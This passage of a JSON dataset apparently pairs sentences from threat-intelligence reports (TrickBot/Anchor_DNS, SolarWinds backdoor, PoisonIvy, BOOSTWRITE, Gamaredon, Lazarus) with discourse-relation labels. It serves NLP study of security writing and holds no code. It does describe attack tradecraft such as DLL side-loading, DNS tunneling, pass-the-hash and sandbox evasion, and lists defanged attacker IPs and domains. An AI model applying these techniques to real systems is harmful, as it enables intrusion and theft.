        "S1": "Meterpreter & Cobalt Strike Implants",
        "S2": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers use a Meterpreter implant to carry out post-exploitation actions.",
        "S2": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory.",
        "S2": "Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Metsrv.dll: For Meterpreter, where the protocol and extension systems are implemented",
        "S2": "Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.",
        "relation": "MISC"
    },
    {
        "S1": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "S2": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker uses the following metasploit modules:",
        "S2": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "S2": "The ADfind tool has reportedly been used previously in attacks related to FIN6.",
        "relation": "MISC"
    },
    {
        "S1": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "S2": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:",
        "S2": "Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.",
        "relation": "MISC"
    },
    {
        "S1": "After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64-encoded and compressed PowerShell command.",
        "S2": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "S2": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "relation": "MISC"
    },
    {
        "S1": "One of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security.",
        "S2": "Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:",
        "S2": "anchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS.",
        "relation": "MISC"
    },
    {
        "S1": "Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.",
        "S2": "During our investigation, we found several unidentified malware samples related to TrickBot infections.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "S2": "During our investigation, we found several unidentified malware samples related to TrickBot infections.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "S2": "This above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker, and Mimikatz.",
        "relation": "MISC"
    },
    {
        "S1": "The following example shows considerable changes in the code of the WinMain() function between an older variant of Anchor_DNS and the new variant.",
        "S2": "- New Variant : executes the malware\u2019s main communication module with the C2",
        "relation": "ELABORATION"
    },
    {
        "S1": "- New Variant : executes the malware\u2019s main communication module with the C2",
        "S2": "- -s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "relation": "MISC"
    },
    {
        "S1": "- -s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "S2": "Older and newer versions of Anchor_DNS communicate over DNS.",
        "relation": "MISC"
    },
    {
        "S1": "Older and newer versions of Anchor_DNS communicate over DNS.",
        "S2": "Anchor_DNS communicates with the C2 servers over DNS using DNS Tunneling.",
        "relation": "ELABORATION"
    },
    {
        "S1": "By implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS traffic.",
        "S2": "Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware is dubbed Anchor by its authors and has been active since August 2018.",
        "S2": "However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.",
        "S2": "Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:",
        "relation": "MISC"
    },
    {
        "S1": "Many Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.",
        "S2": "Similar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:",
        "relation": "MISC"
    },
    {
        "S1": "Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:",
        "S2": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "relation": "NEXT"
    },
    {
        "S1": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "S2": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "S2": "The request and response follow the same C2 communication format as TrickBot.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once it has established connectivity, it communicates with a set of hardcoded C2 servers.",
        "S2": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "relation": "MISC"
    },
    {
        "S1": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "S2": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "S2": "The same list is also used by TrickBot:",
        "relation": "MISC"
    },
    {
        "S1": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "S2": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "relation": "MISC"
    },
    {
        "S1": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "S2": "In certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.",
        "relation": "NEXT"
    },
    {
        "S1": "The same list is also used by TrickBot:",
        "S2": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "relation": "MISC"
    },
    {
        "S1": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "S2": "For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:",
        "relation": "MISC"
    },
    {
        "S1": "For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:",
        "S2": "The same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The initial indicator of the attack was a malicious web shell that was detected on an IIS server, coming out of the w3wp.exe process.",
        "S2": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An investigation of the web shell, later classified as a modified version of the China Chopper web shell, uncovered several attack phases and TTPs.",
        "S2": "China Chopper is a web shell first discovered in 2012 that is commonly used by malicious Chinese actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor was able to leverage the web shell to run reconnaissance commands, steal credentials, and deploy other tools.",
        "S2": "The threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "S2": "We renamed this sample to maybemimi.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "S2": "By creating these accounts, they ensured they would maintain access between different waves of the attack.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.",
        "S2": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "relation": "NEXT"
    },
    {
        "S1": "One of the reconnaissance commands was to run a modified nbtscan tool (\"NetBIOS nameserver scanner\") to identify available NetBIOS name servers locally or over the network.",
        "S2": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "relation": "NEXT"
    },
    {
        "S1": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "S2": "A second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY).",
        "relation": "MISC"
    },
    {
        "S1": "The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes.",
        "S2": "In order to obtain credentials, the threat actor used another technique that can be seen in the below screenshots.",
        "relation": "LIST"
    },
    {
        "S1": "The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes.",
        "S2": "The dumped hashes were used to authenticate to other machines via pass the hash.",
        "relation": "NEXT"
    },
    {
        "S1": "This version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing.",
        "S2": "We renamed this sample to maybemimi.exe.",
        "relation": "MISC"
    },
    {
        "S1": "We renamed this sample to maybemimi.exe.",
        "S2": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "relation": "MISC"
    },
    {
        "S1": "Reverse engineering shows the similarity between maybemimi.exe and mimikatz.",
        "S2": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "relation": "MISC"
    },
    {
        "S1": "Once the threat actor mapped the network and obtained credentials (through net use), they began to move laterally.",
        "S2": "The following example demonstrates how the threat actor moved laterally from the first machine, compromised by the modified version of the China Chopper web shell, to other machines inside the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "By creating these accounts, they ensured they would maintain access between different waves of the attack.",
        "S2": "The strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory.",
        "relation": "MISC"
    },
    {
        "S1": "A second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY).",
        "S2": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Among its most notable features are:",
        "S2": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "relation": "MISC"
    },
    {
        "S1": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "S2": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "relation": "NEXT"
    },
    {
        "S1": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "S2": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "relation": "MISC"
    },
    {
        "S1": "The strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory.",
        "S2": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "relation": "NEXT"
    },
    {
        "S1": "The PIVY payload was dropped along with the trusted and signed Samsung tool (RunHelp.exe) in the following manner:",
        "S2": "- After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.",
        "S2": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "relation": "ELABORATION"
    },
    {
        "S1": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "S2": "\u26a0\ufe0f Note: Our team has reached out to and advised the targeted organizations on active containment actions.",
        "relation": "MISC"
    },
    {
        "S1": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "S2": "The contents of the compressed data was crucial in understanding the threat actor\u2019s motivation for the attack, as well as what type of information they were after.",
        "relation": "MISC"
    },
    {
        "S1": "From these web shells, they launched reconnaissance commands, stole data, and dropped additional tools including portqry.exe, renamed cmd.exe, winrar, and the notorious hTran.",
        "S2": "In an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it.",
        "relation": "NEXT"
    },
    {
        "S1": "In an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it.",
        "S2": "This threat actor is known to stage the data in multi-part archives before exfiltration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This \u2018connection bouncer\u2019 tool lets the threat actor redirect ports and connections between different networks and obfuscate C2 server traffic.",
        "S2": "The threat actor made some modifications to the original source code of hTran.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor made some modifications to the original source code of hTran.",
        "S2": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "S2": "By looking at the original source code, we were able to identify that this is supposed to be \u201cConnect error\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "The attackers had to find a suitable place in this DLL component to insert their code.",
        "S2": "A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.",
        "relation": "MISC"
    },
    {
        "S1": "Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running.",
        "S2": "The threat actors were savvy enough to avoid give-away terminology like \u201cbackdoor\u201d, \u201ckeylogger\u201d, etc., and instead opted for a more neutral jargon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running.",
        "S2": "Among those tasks is Background Inventory, which ultimately starts the malicious code.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The modification to this function is very lightweight and could be easily overlooked\u2014all it does is to execute the method OrionImprovementBusinessLayer.Initialize within a parallel thread, so that the normal execution flow of RefreshInternal is not altered.",
        "S2": "A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.",
        "relation": "MISC"
    },
    {
        "S1": "The purpose of this class, which initiates its execution with a method named Start (likely at an early stage when the DLL is loaded), is to initialize various other components and schedule the execution of several tasks.",
        "S2": "At first glance, the code in this DLL looks normal and doesn\u2019t raise suspicions, which could be part of the reason why the insertion of malicious code was undetected for months, especially if the code for this DLL was not frequently updated.",
        "relation": "MISC"
    },
    {
        "S1": "The functionality of the backdoor resides entirely in the class OrionImprovementBusinessLayer, comprising 13 subclasses and 16 methods.",
        "S2": "To have some minimal form of obfuscation from prying eyes, the strings in the backdoor are compressed and encoded in Base64, or their hashes are used instead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors were savvy enough to avoid give-away terminology like \u201cbackdoor\u201d, \u201ckeylogger\u201d, etc., and instead opted for a more neutral jargon.",
        "S2": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.",
        "relation": "MISC"
    },
    {
        "S1": "It carries out several checks to verify that it is running in a real victim\u2019s environment:",
        "S2": "If any of these checks fail, the backdoor terminates.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "- It verifies that the domain name of the current device meets the following conditions:",
        "S2": "- It checks that there are no running processes related to security-related software (e.g., Windbg, Autoruns, Wireshark)",
        "relation": "NEXT"
    },
    {
        "S1": "If any of these checks fail, the backdoor terminates.",
        "S2": "After the extensive validation described above, the backdoor enters its main execution stage.",
        "relation": "NEXT"
    },
    {
        "S1": "At its core, the backdoor is a very standard one that receives instructions from the C2 server, executes those instructions, and sends back information.",
        "S2": "In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.",
        "S2": "In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.",
        "S2": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "relation": "MISC"
    },
    {
        "S1": "In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",
        "S2": "It then sends this JSON document to the C2 server.",
        "relation": "NEXT"
    },
    {
        "S1": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "S2": "The dynamically generated portion of the domain is the interesting part.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "S2": "- The domain name of the device",
        "relation": "MISC"
    },
    {
        "S1": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "S2": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The dynamically generated portion of the domain is the interesting part.",
        "S2": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "relation": "MISC"
    },
    {
        "S1": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "S2": "Here are examples of final URLs generated by the backdoor:",
        "relation": "ELABORATION"
    },
    {
        "S1": "If the communication is successful, the C2 responds with an encoded, compressed buffer of data containing commands for the backdoor to execute.",
        "S2": "The backdoor accepts the following commands:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor accepts the following commands:",
        "S2": "The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.",
        "S2": "Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.",
        "relation": "NEXT"
    },
    {
        "S1": "Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.",
        "S2": "The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.",
        "relation": "ELABORATION"
    },
    {
        "S1": "BOOSTWRITE is a loader crafted to be launched via abuse of the DLL search order of applications which load the legitimate \u2018Dwrite.dll\u2019 provided by the Microsoft DirectX Typography Services.",
        "S2": "Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.",
        "relation": "MISC"
    },
    {
        "S1": "Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.",
        "S2": "Before exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once loaded, `DWrite.dll` connects to a hard-coded IP and port from which it retrieves a decryption key and initialization vector (IV) to decrypt two embedded payload DLLs.",
        "S2": "Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Next, the malware scans its own image to find the location of a 32-byte long multi-XOR key which is used to decode data inside its body.",
        "S2": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "relation": "NEXT"
    },
    {
        "S1": "Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads.",
        "S2": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "S2": "The malware logs various plaintext messages to the previously created logfile %TEMP%\\~rds<rnd_numbers> which are indicative of the loader\u2019s execution progress.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware logs various plaintext messages to the previously created logfile %TEMP%\\~rds<rnd_numbers> which are indicative of the loader\u2019s execution progress.",
        "S2": "Before exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware decrypts and loads two payload DLLs.",
        "S2": "Furthermore, this enables the malware to alter the user\u2019s last input time to ensure application sessions do not time out.",
        "relation": "MISC"
    },
    {
        "S1": "RDFSNIFFER is a module loaded by BOOSTWRITE which allows an attacker to monitor and tamper with legitimate connections made via NCR Corporation\u2019s \u2018Aloha Command Center Client\u2019 (RDFClient), an application designed to provide visibility and system management capabilities to remote IT techs.",
        "S2": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "relation": "ELABORATION"
    },
    {
        "S1": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "S2": "This backdoor allows an attacker to upload, download, execute and/or delete arbitrary files (Table 2).",
        "relation": "MISC"
    },
    {
        "S1": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "S2": "This module also contains a backdoor component that enables it to inject commands into an active RDFClient session.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st:",
        "S2": "At the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload.",
        "S2": "- Copy content of the LNK file into \"g4ZokyumB2DC4.tmp\" in %APPDATA% temp directory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Decompress content of \"o423DFDS4.tmp\" in temp directory along with a decoy PDF document using \"expand.exe -F:*\" (Figure 3) .",
        "S2": "- Execute the JS file by calling Wscript.",
        "relation": "NEXT"
    },
    {
        "S1": "- Open the decoy document.",
        "S2": "The JavaScript file performs the following commands:",
        "relation": "MISC"
    },
    {
        "S1": "The list of commands executed by this LNK shortcut is the same as the one reported by Anomali on the Higasia Covid-19 campaign.",
        "S2": "Malwarebytes (in this case the Nebula business version) stopped the LNK file execution from WinRAR and therefore completely stopped the attack.",
        "relation": "MISC"
    },
    {
        "S1": "- Copy \"svchhast.exe\" into startup directory and rename it as \"officeupdate.exe\".",
        "S2": "Svchast.exe is a small loader that loads the content of the shellcode stored in \"66DF3DFG.tmp\".",
        "relation": "NEXT"
    },
    {
        "S1": "At the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.",
        "S2": "We reproduced this attack in our lab using an email as the infection vector, as we surmise that victims were spear-phished.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Gamaredon group uses a package that includes a custom Microsoft Outlook Visual Basic for Applications (VBA) project.",
        "S2": "They have been using this module in three different ways to send malicious email to:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Gamaredon group uses a package that includes a custom Microsoft Outlook Visual Basic for Applications (VBA) project.",
        "S2": "This bundle of malicious code starts out with a VBScript that first kills the Outlook process if it is running, and then removes security around VBA macro execution in Outlook by changing registry values.",
        "relation": "NEXT"
    },
    {
        "S1": "It also saves to disk the malicious OTM file (Outlook VBA project) that contains a macro, the malicious email attachment and, in some cases, a list of recipients that the emails should be sent to.",
        "S2": "While abusing a compromised mailbox to send malicious emails without the victim\u2019s consent is not a new technique, we believe this is the first publicly documented case of an attack group using an OTM file and Outlook macro to achieve it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "S2": "While abusing a compromised mailbox to send malicious emails without the victim\u2019s consent is not a new technique, we believe this is the first publicly documented case of an attack group using an OTM file and Outlook macro to achieve it.",
        "relation": "MISC"
    },
    {
        "S1": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "S2": "They have been using this module in three different ways to send malicious email to:",
        "relation": "MISC"
    },
    {
        "S1": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "S2": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "relation": "NEXT"
    },
    {
        "S1": "The malicious code is executed once the Application.Startup event is received.",
        "S2": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "relation": "NEXT"
    },
    {
        "S1": "They have been using this module in three different ways to send malicious email to:",
        "S2": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They have been using this module in three different ways to send malicious email to:",
        "S2": "This was fixed in a later version of this module \u2014 another example of the Gamaredon group\u2019s fast development pace and apparent lack of attention to detail.",
        "relation": "MISC"
    },
    {
        "S1": "For example, recent samples uploaded to VirusTotal coming from regions that are not traditionally targeted by Gamaredon, such as Japan, could be explained by the actions of this module.",
        "S2": "These are very similar to the content of the malicious attachments used in Gamaredon\u2019s initial spearphishing campaigns.",
        "relation": "MISC"
    },
    {
        "S1": "As seen in Figure 2, the VBA code builds the email body and attaches the malicious document to the email.",
        "S2": "Figure 3 shows an email generated by this malicious component.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Figure 3 shows an email generated by this malicious component.",
        "S2": "However, as illustrated in Figure 3, there is a problem with the Russian encoding.",
        "relation": "MISC"
    },
    {
        "S1": "Figure 3 shows an email generated by this malicious component.",
        "S2": "This was fixed in a later version of this module \u2014 another example of the Gamaredon group\u2019s fast development pace and apparent lack of attention to detail.",
        "relation": "MISC"
    },
    {
        "S1": "We identified two phishing documents: \u201cLockheed_Martin_JobOpportunities.docx\u201d and \u201cSalary_Lockheed_Martin_job_opportunities_confidential.doc\u201d.",
        "S2": "Unfortunately, we were unable to get further details about the remote htm payload as it returns a 404 error.",
        "relation": "MISC"
    },
    {
        "S1": "Interestingly, to make the macro seem more innocuous, Lazarus uses function names identical to the exported functions of WMVCORE.DLL and variable names thematically related to playback (fig. 4).",
        "S2": "Lazarus has also used other novel methods to execute shellcode such as by using the function EnumSystemLocalesA as a callback to shellcode written to executable heap.",
        "relation": "MISC"
    },
    {
        "S1": "The macro uses a check for a document variable before entering its main functionality block.",
        "S2": "The second stage payload is shellcode that is embedded as a base64 encoded string array inside the macro that is decoded by using CryptStringToBinaryW (fig. 5).",
        "relation": "NEXT"
    },
    {
        "S1": "The second stage payload is shellcode that is embedded as a base64 encoded string array inside the macro that is decoded by using CryptStringToBinaryW (fig. 5).",
        "S2": "The macro then sets a document variable to ensure that subsequent runs would not execute the shellcode decode and the KernelCllbackTable hijack again.",
        "relation": "NEXT"
    },
    {
        "S1": "The malicious document contains two payloads as encrypted string arrays embedded in Visual Basic macro code.",
        "S2": "The VBA Macro code is self-executing and configured to execute when the OLE document (MS Word doc) is opened (via \u201cSub AutoOpen()\u201d).",
        "relation": "NEXT"
    },
    {
        "S1": "The AutoOpen() function in the VBA Macro performs the following tasks in the sequence listed:",
        "S2": "- After writing the second stage payload to disk the VBA code performs two important actions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Decodes the target file path of the second stage binary payload.",
        "S2": "- After writing the second stage payload to disk the VBA code performs two important actions.",
        "relation": "NEXT"
    },
    {
